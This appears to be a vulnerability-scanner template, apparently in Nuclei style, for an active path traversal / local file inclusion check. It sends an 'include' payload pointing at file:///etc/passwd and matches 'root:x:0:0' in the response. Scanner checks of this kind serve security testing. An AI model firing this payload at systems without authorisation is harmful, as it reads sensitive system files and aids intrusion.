id: lfi2-074
name: 'Path traversal2 via include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - 'file:///etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
